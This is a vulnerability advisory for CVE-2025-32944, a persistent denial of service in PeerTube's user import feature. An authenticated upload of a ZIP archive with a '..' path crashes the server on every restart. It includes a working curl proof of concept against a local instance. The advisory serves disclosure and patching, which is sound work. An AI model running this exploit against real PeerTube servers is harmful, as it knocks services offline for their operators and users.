---
description: CVE-2025-32944 Medium severity. PeerTube User Import Authenticated Persistent Denial of Service
title: PeerTube User Import Authenticated Persistent Denial of Service
date_published: "2025-04-14"
last_updated: "2025-04-14"
xray_id:
vul_id: CVE-2025-32944
cvss: 6.5
severity: medium
discovered_by: Ori Hollander
type: vulnerability
---
## Summary
An Uncaught Exception in PeerTube can lead to a persistent Denial of Service in User Import.

This vulnerability allows any authenticated user to cause the server to stop functioning in a persistent manner.



## Component

[PeerTube](https://github.com/Chocobozzz/PeerTube)



## Affected versions

(, 7.1.0]



## Description

If user import is enabled (which is the default setting), any registered user can upload an archive for importing. The code uses the yauzl library for reading the archive.
If the yauzl library encounters a filename that is considered illegal, [it raises an exception](https://github.com/thejoshwolfe/yauzl/blob/de292f220268473eb20aef64b0a77faa9d004d9a/index.js#L737). For example, if a filename includes “..” in one of its parts, an “invalid relative path” error is raised. PeerTube does not catch this exception, thus it crashes. Even after starting the server again, it tries to read the file and crashes again, causing a permanent denial of service until the file is deleted from the system.

## PoC

This PoC assumes that there is a PeerTube instance on the machine listening on ports 3000 (client) and 9000 (server). Note that running this PoC will cause PeerTube’s server to shut down.



1. First, using a browser, log in to the PeerTube instance with any user’s credentials, and use the inspection screen to copy the authorization token of the user.
1. Create a file `evil.zip` in the current directory, which contains at least one zip entry with a `..` in its path
1. In a terminal, run the following commands (replace “user_token” with the token obtained from step #1):
```
new_location=http:$(curl -s -D - 'http://127.0.0.1:3000/api/v1/users/1/imports/import-resumable' -H 'Authorization: Bearer user_token' -H 'Content-Type: application/json; charset=UTF-8' -H 'X-Upload-Content-Length: 168' -H 'X-Upload-Content-Type: application/x-zip-compressed' --data-raw '{"name":"evil.zip","mimeType":"application/x-zip-compressed","size":168,"lastModified":1743493990068,"filename":"evil.zip"}' | awk '/^location:/{print $2}' | tr -d '\r')
curl -X PUT "$new_location" -H "Content-Type: application/octet-stream" -H "Content-Range: bytes 0-167/168" -H 'Authorization: user_token' --data-binary @evil.zip
```
If everything was done correctly, the PeerTube server will crash, and will keep crashing as long as the ZIP file is not deleted from the system.



## Vulnerability Mitigations

No mitigations are supplied for this issue



## References

[Fix release](https://github.com/Chocobozzz/PeerTube/releases/tag/v7.1.1)

[PoC Materials](https://drive.google.com/file/d/1zmXFNutT4ACOJZGmxhU22nhu9Fbn4ui2/view?usp=drive_link)
